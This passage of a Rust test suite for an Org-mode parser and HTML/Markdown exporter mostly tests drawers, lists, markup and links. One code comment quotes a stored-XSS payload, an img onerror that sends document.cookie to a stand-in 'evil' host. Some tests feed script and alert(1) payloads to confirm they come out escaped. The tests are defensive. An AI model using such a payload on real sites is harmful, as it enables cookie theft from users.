        let (_, elements) = parse_org_document(src);
        assert_eq!(elements.len(), 1);
        let OrgElement::List { ordered, items } = &elements[0] else {
            panic!("expected a List element, got {:?}", elements[0]);
        };
        assert!(ordered);
        assert_eq!(items.len(), 2, "the drawer must not be misparsed as a third item");
        assert!(
            !items[0].content.contains(":PROPERTIES:") && !items[0].content.contains(":END:"),
            "drawer must not leak into item 1's content: {:?}",
            items[0].content
        );
        assert!(
            items[0].content.contains("upgrade fails partway."),
            "real prose around the drawer must survive: {:?}",
            items[0].content
        );
        assert!(
            items[0]
                .content
                .contains("Validated by: cross-checked against the runbook."),
            "content after the drawer must survive: {:?}",
            items[0].content
        );
        assert_eq!(items[1].content, "Establish an on-call rotation.");
    }

    #[test]
    fn unordered_list_item_with_its_own_properties_drawer_does_not_leak_it() {
        let src = "- First item.\n  :PROPERTIES:\n  :ID: abc123\n  :END:\n  More text.\n- Second item.\n";
        let (_, elements) = parse_org_document(src);
        let OrgElement::List { items, .. } = &elements[0] else {
            panic!("expected a List element, got {:?}", elements[0]);
        };
        assert_eq!(items.len(), 2);
        assert!(!items[0].content.contains(":PROPERTIES:"));
        assert_eq!(items[0].content, "First item. More text.");
        assert_eq!(items[1].content, "Second item.");
    }

    #[test]
    fn ordered_list_recognizes_multi_digit_item_numbers() {
        // Real, reproducible bug in the onprem-iac KB's Phase 6 checklist
        // (10 items): strip_prefix(|c: char| c.is_ascii_digit()) strips only
        // ONE leading digit, not a run -- "10. Document..." became
        // "0. Document..." after stripping just the "1", which then failed
        // the ". "/") " check entirely. Item 10 fell through to plain-
        // paragraph parsing instead of being recognized as list item 10,
        // breaking both its own :PROPERTIES: drawer stripping (a different,
        // now also-fixed code path) and the list's own item count/order.
        let src = "1. First.\n2. Second.\n9. Ninth.\n10. Tenth.\n11. Eleventh.\n";
        let (_, elements) = parse_org_document(src);
        assert_eq!(elements.len(), 1, "all five items must parse as ONE list, not split at item 10");
        let OrgElement::List { ordered, items } = &elements[0] else {
            panic!("expected a List element, got {:?}", elements[0]);
        };
        assert!(ordered);
        assert_eq!(items.len(), 5);
        assert_eq!(items[3].content, "Tenth.");
        assert_eq!(items[4].content, "Eleventh.");
    }

    #[test]
    fn a_plain_paragraphs_embedded_properties_drawer_is_not_leaked() {
        // The third of three accumulation sites that all needed the same
        // fix: the top-level scanner (pre-existing, #528), both list
        // continuation loops (fixed above), and this generic paragraph
        // fallback -- exercised for real when a multi-digit ordered-list
        // item (see the test above) fell through to paragraph parsing
        // before that bug was fixed, but also reachable directly by any
        // plain paragraph carrying its own drawer.
        let src = "Some prose.\n:PROPERTIES:\n:ID: xyz\n:END:\nMore prose after the drawer.\n";
        let (_, elements) = parse_org_document(src);
        let OrgElement::Paragraph(text) = &elements[0] else {
            panic!("expected a Paragraph element, got {:?}", elements[0]);
        };
        assert!(!text.contains(":PROPERTIES:") && !text.contains(":END:"));
        assert!(text.contains("Some prose."));
        assert!(text.contains("More prose after the drawer."));
    }

    #[test]
    fn parse_options() {
        let src = "#+OPTIONS: toc:2 H:3 num:nil\n";
        let (meta, _) = parse_org_document(src);
        assert!(meta.options.toc);
        assert_eq!(meta.options.toc_depth, 2);
        assert_eq!(meta.options.headline_levels, 3);
        assert!(!meta.options.num);
    }

    #[test]
    fn inline_markup_bold_html() {
        let result = convert_inline_markup_str("hello *world*", InlineTarget::Html);
        assert_eq!(result, "hello <b>world</b>");
    }

    #[test]
    fn non_ascii_characters_survive_unmangled() {
        // Regression: the main loop decoded one raw BYTE at a time
        // (`bytes[i] as char`, `i += 1`) instead of one Unicode scalar at
        // a time -- every non-ASCII character (an em-dash, any accented
        // character) got split into its 2-4 individual UTF-8 bytes, each
        // reinterpreted as a bogus Latin-1-ish char. Found by actually
        // running a real Spanish translation through this path -- every
        // accented word came out mangled (e.g. "configuración" ->
        // "configuraciÃ³n"). See cuttlefisch/mae#528.
        let result = convert_inline_markup_str(
            "el flujo — la configuración, todavía, ¿cómo?",
            InlineTarget::Html,
        );
        assert_eq!(result, "el flujo — la configuración, todavía, ¿cómo?");
    }

    #[test]
    fn inline_markup_italic_html() {
        let result = convert_inline_markup_str("hello /world/", InlineTarget::Html);
        assert_eq!(result, "hello <i>world</i>");
    }

    #[test]
    fn inline_markup_code_html() {
        let result = convert_inline_markup_str("hello =world=", InlineTarget::Html);
        assert_eq!(result, "hello <code>world</code>");
    }

    #[test]
    fn adversarial_code_span_content_is_html_escaped_not_injected() {
        // Real, no-click stored-XSS: a KB node body containing
        // ~<img src=x onerror=fetch('https://evil/?c='+document.cookie)>~
        // used to pass `content` straight into `<code>{}</code>` with zero
        // escaping -- the resulting fragment is later assigned via
        // `element.innerHTML` in the exported HTML's chord-diagram viewer,
        // so the payload executes on render, no interaction required.
        let payload = "~<img src=x onerror=alert(1)>~";
        let result = convert_inline_markup_str(payload, InlineTarget::Html);
        assert!(
            !result.contains("<img"),
            "a live <img> tag must never survive into the rendered fragment: {result}"
        );
        assert_eq!(result, "<code>&lt;img src=x onerror=alert(1)&gt;</code>");
    }

    #[test]
    fn adversarial_strikethrough_content_is_html_escaped_not_injected() {
        // Same bug, same fix, the sibling `+strikethrough+` marker (<del>)
        // had the identical unescaped-content pattern.
        let payload = "+<script>alert(1)</script>+";
        let result = convert_inline_markup_str(payload, InlineTarget::Html);
        assert!(!result.contains("<script>"), "unescaped: {result}");
        assert_eq!(result, "<del>&lt;script&gt;alert(1)&lt;/script&gt;</del>");
    }

    #[test]
    fn inline_markup_bold_markdown() {
        let result = convert_inline_markup_str("hello *world*", InlineTarget::Markdown);
        assert_eq!(result, "hello **world**");
    }

    #[test]
    fn inline_link_html() {
        let result =
            convert_inline_markup_str("see [[https://mae.invalid][Example]]", InlineTarget::Html);
        assert!(result.contains("<a href=\"https://mae.invalid\">Example</a>"));
    }

    #[test]
    fn inline_link_markdown() {
        let result = convert_inline_markup_str(
            "see [[https://mae.invalid][Example]]",
            InlineTarget::Markdown,
        );
        assert!(result.contains("[Example](https://mae.invalid)"));
    }

    #[test]
    fn filter_exclude_tags() {
        let elements = vec![
            OrgElement::Heading {
                level: 1,
                title: "Keep".to_string(),
                tags: vec![],
                todo: None,
                children: vec![],
            },
            OrgElement::Heading {
                level: 1,
                title: "Remove".to_string(),
                tags: vec!["noexport".to_string()],
                todo: None,
                children: vec![],
            },
        ];
        let filtered = filter_by_tags(&elements, &[], &["noexport".to_string()]);
        assert_eq!(filtered.len(), 1);
    }

    #[test]
    fn extract_subtree_works() {
        let elements = vec![
            OrgElement::Heading {
                level: 1,
                title: "H1".to_string(),
                tags: vec![],
                todo: None,
                children: vec![],
            },
            OrgElement::Paragraph("p1".to_string()),
            OrgElement::Heading {
                level: 2,
                title: "H2".to_string(),
                tags: vec![],
                todo: None,
                children: vec![],
            },
            OrgElement::Paragraph("p2".to_string()),
            OrgElement::Heading {
                level: 1,
                title: "H1b".to_string(),
                tags: vec![],
                todo: None,
                children: vec![],
            },
        ];
        let sub = extract_subtree(&elements, 0);
        assert_eq!(sub.len(), 4); // H1, p1, H2, p2
    }

    #[test]
    fn roundtrip_org_to_md_to_org() {
        let org_src =
            "#+title: Test\n\n* Heading\n\nSome paragraph text.\n\n- item one\n- item two\n";
        let (meta, elements) = parse_org_document(org_src);
        let md_exporter = markdown::MarkdownExporter;
        let md = md_exporter.export(&meta, &elements);
        let (meta2, elements2) = markdown_parser::parse_markdown_document(&md);
        assert_eq!(meta2.title.as_deref(), Some("Test"));
        // Should have heading + paragraph + list
        assert!(elements2.len() >= 3, "got {} elements", elements2.len());
    }

    #[test]
    fn roundtrip_md_to_org_to_md() {
        let md_src = "# Heading\n\nA paragraph.\n\n```python\nprint(1)\n```\n\n- one\n- two\n";
        let (meta, elements) = markdown_parser::parse_markdown_document(md_src);
        let org_writer = org_writer::OrgWriter;
        let org = org_writer.export(&meta, &elements);
        let (meta2, elements2) = parse_org_document(&org);
        // Should preserve structure
        assert!(meta2.title.is_none()); // no title in original
        assert!(elements2.len() >= 3, "got {} elements", elements2.len());
        // Check heading survived
        assert!(matches!(
            &elements2[0],
            OrgElement::Heading { level: 1, .. }
        ));
    }

    // cuttlefisch/mae#528's remaining bug + #523's three missing features.

    #[test]
    fn properties_drawer_is_skipped_not_leaked_into_output() {
        // Real repro from assets/manual/concept-modules.org.
        let src = ":PROPERTIES:\n:ID: concept:modules\n:KIND: concept\n:ALIASES: plugins, packages\n:END:\n#+title: Module System\n\nBody text.\n";
        let (meta, elements) = parse_org_document(src);
        assert_eq!(meta.title.as_deref(), Some("Module System"));
        assert_eq!(elements.len(), 1, "got {elements:?}");
        assert!(matches!(&elements[0], OrgElement::Paragraph(p) if p == "Body text."));
    }

    #[test]
    fn properties_drawer_mid_document_after_a_heading_is_also_skipped() {
        // Org drawers commonly appear right after a heading, not only at
        // the very top of the file.
        let src = "* Heading\n:PROPERTIES:\n:ID: h1\n:END:\nBody under heading.\n";
        let (_, elements) = parse_org_document(src);
        assert_eq!(elements.len(), 2, "got {elements:?}");
        assert!(matches!(&elements[0], OrgElement::Heading { .. }));
        assert!(matches!(&elements[1], OrgElement::Paragraph(p) if p == "Body under heading."));
    }

    #[test]
    fn unterminated_properties_drawer_consumes_to_eof_without_hanging() {
        // Adversarial: a drawer missing its `:END:` must not infinite-loop
        // or panic -- it should just consume the rest of the document.
        let src = ":PROPERTIES:\n:ID: x\nno end marker here\n";
        let (_, elements) = parse_org_document(src);
        assert_eq!(elements.len(), 0, "got {elements:?}");
    }

    #[test]
    fn paragraph_continuation_with_unspaced_double_star_is_not_split_early() {
        // The same latent bug #536 fixed in heading DETECTION also existed,
        // independently, in the paragraph-continuation break check -- a
        // continuation line like "**Note:** ..." would wrongly end the
        // paragraph early (as if a heading were starting) even though
        // heading detection itself would correctly reject it. Both now
        // share `is_heading_line`.
        let src = "First line of the paragraph.\n**Note:** this continues the SAME paragraph, not a new one.\n";
        let (_, elements) = parse_org_document(src);
        assert_eq!(elements.len(), 1, "got {elements:?}");
        assert!(matches!(&elements[0], OrgElement::Paragraph(p)
            if p.contains("First line") && p.contains("**Note:**")));
    }

    #[test]
    fn begin_example_block_parses_and_is_not_inline_markup_converted() {
        let src = "#+begin_example\nliteral *not bold* text\n#+end_example\n";
        let (_, elements) = parse_org_document(src);
        assert_eq!(elements.len(), 1, "got {elements:?}");
        assert!(matches!(&elements[0], OrgElement::Example(c) if c == "literal *not bold* text"));

        let html = html::HtmlExporter.export(&OrgMeta::default(), &elements);
        assert!(
            html.contains("<pre class=\"example\">literal *not bold* text</pre>"),
            "example content must be escaped-only, not markup-converted: {html}"
        );
    }

    #[test]
    fn begin_example_block_html_escapes_its_content() {
        let src = "#+begin_example\n<script>alert(1)</script>\n#+end_example\n";
        let (_, elements) = parse_org_document(src);
        let html = html::HtmlExporter.export(&OrgMeta::default(), &elements);
        assert!(!html.contains("<script>"), "must be escaped: {html}");
        assert!(html.contains("&lt;script&gt;"), "got: {html}");
    }

    #[test]
    fn bare_url_is_autolinked_in_html() {
        let result = convert_inline_markup_str(
            "See https://example.com/docs for details.",
            InlineTarget::Html,
        );
        assert_eq!(
            result,
            "See <a href=\"https://example.com/docs\">https://example.com/docs</a> for details."
        );
    }

    #[test]
    fn bare_url_trailing_punctuation_is_excluded_from_the_link() {
        // "https://example.com." (with a trailing period ending the
        // sentence) must link only the URL, not swallow the period.
        let result = convert_inline_markup_str("Go to https://example.com.", InlineTarget::Html);
        assert_eq!(
            result,
            "Go to <a href=\"https://example.com\">https://example.com</a>."
        );
    }

    #[test]
    fn bare_url_inside_parens_still_autolinks() {
        let result = convert_inline_markup_str("(see https://example.com)", InlineTarget::Html);
        assert_eq!(
            result,
            "(see <a href=\"https://example.com\">https://example.com</a>)"
        );
    }

    #[test]
    fn bracketed_org_link_is_unaffected_by_bare_url_handling() {
        // Regression guard: an existing [[url][label]] link must still go
        // through the dedicated org-link arm, not get double-processed by
        // the new bare-URL arm.
        let result =
            convert_inline_markup_str("[[https://example.com][Example]]", InlineTarget::Html);
        assert_eq!(result, "<a href=\"https://example.com\">Example</a>");
    }

    #[test]
    fn checkbox_marker_parses_all_three_states() {
        assert_eq!(
            parse_checkbox_marker("[ ] Buy milk"),
            Some((CheckboxState::Unchecked, "Buy milk"))
        );
        assert_eq!(
            parse_checkbox_marker("[X] Done thing"),
            Some((CheckboxState::Checked, "Done thing"))
        );
        assert_eq!(
            parse_checkbox_marker("[x] also done"),
            Some((CheckboxState::Checked, "also done"))
        );
        assert_eq!(
            parse_checkbox_marker("[-] Partially done"),
            Some((CheckboxState::Partial, "Partially done"))
        );
    }

    #[test]
    fn checkbox_marker_negative_cases() {
        assert_eq!(parse_checkbox_marker("Not a checkbox at all"), None);
        assert_eq!(parse_checkbox_marker("[Not a checkbox]"), None);
        assert_eq!(parse_checkbox_marker(""), None);
        assert_eq!(parse_checkbox_marker("[Q]"), None);
    }

    #[test]
    fn checkbox_list_items_render_as_disabled_html_checkboxes() {
        let src = "- [ ] Unchecked task\n- [X] Checked task\n- [-] Partial task\n- Plain item, no checkbox\n";
        let (_, elements) = parse_org_document(src);
        let html = html::HtmlExporter.export(&OrgMeta::default(), &elements);
        assert!(
            html.contains(
                "<input type=\"checkbox\" disabled aria-checked=\"false\"> Unchecked task"
            ),
            "got: {html}"
        );
        assert!(
            html.contains(
                "<input type=\"checkbox\" disabled checked aria-checked=\"true\"> Checked task"
            ),
            "got: {html}"
        );
        assert!(
            html.contains("<input type=\"checkbox\" disabled aria-checked=\"mixed\"> Partial task"),
            "got: {html}"
        );
        assert!(
            html.contains("<li>Plain item, no checkbox</li>"),
            "a plain list item must render exactly as before, no stray checkbox markup: {html}"
        );
    }
}
